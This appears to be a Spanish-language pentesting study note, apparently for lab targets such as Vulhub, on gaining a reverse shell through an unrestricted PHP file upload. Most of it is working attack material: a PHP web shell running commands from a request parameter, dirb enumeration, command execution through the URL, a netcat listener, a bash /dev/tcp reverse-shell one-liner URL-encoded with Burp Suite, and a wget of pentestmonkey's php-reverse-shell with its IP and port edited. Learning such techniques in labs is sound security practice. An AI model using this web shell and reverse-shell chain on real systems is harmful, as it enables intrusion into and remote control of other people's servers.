### Reverse Shell con php

- Lo ideal es encontrar un sitio web vulnerable (Vulhub)
- El sitio tiene una subida de archivos de cualquier tipo:

En el btn de selección de archivos, subimos el archivo con el código php para la ejecución del código:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre";
?>
```

Podemos utilizar una herramienta llamada `dirb` para encontrar directorios web

En Kali lo siguiente:

```sh
(root@kali)- [/home/kali/Desktop]
-> dirb http://elsitioweb
...

====> DIRECTORY: http://elsitioweb/uploads/
```

- Copiamos esa ruta... la llevamos a la url
- Ubicamos el archivo malicioso, copiamos el nombre - lo agregamos a la URL
- Nos queda lo siguiente en la URL:

```sh
-> http://elsitioweb/uploads/pwned.php?cmd=whoami
-> http://elsitioweb/uploads/pwned.php?cmd=id
-> http://elsitioweb/uploads/pwned.php?cmd=ls
```

Y ya puedo ejecutar comando desde la url.

Solo faltaría enviar un comando que conecte con nuestro servidor:

```sh
$ ifconfig
# nos devuelve nuestra IP

$ nc -nlvp 443 # cualquier puerto
```

Necesitamos que vaya el comando en la URL:

```sh
$ bash -c 'bash -i >& /dev/tcp/192.../443 0>&1'
# esto asi, no nos sirve
```

Podemos capturarlo con Burp Suite:

- En la sección de `Decoder`
- Pegamos el comando : `bash -c 'bash -i >& /dev/tcp/192.../443 0>&1'`
- En la parte del lado derecho seleccionamos `Encode as...` - `URL`
- Nos entrega un resultado y eso lo pegamos en la URL: 

```sh
$ http://elsitioweb/uploads/pwned.php?cmd=AQUIELCOMANDODEBURPSUITE
```

Con esto tenemos la conexión con la máquina objetivo.

### Plan B:

Nos ahorramos todo esto y buscamos el repositorio en:

`pentestmonkey/php-reverse-shell`

Link: [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shel)

Nos traemos el archivo: `php-reverse-shell.php` con raw

Y con:

```sh
$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

$ ls
```

Editamos el archivo:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127...';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
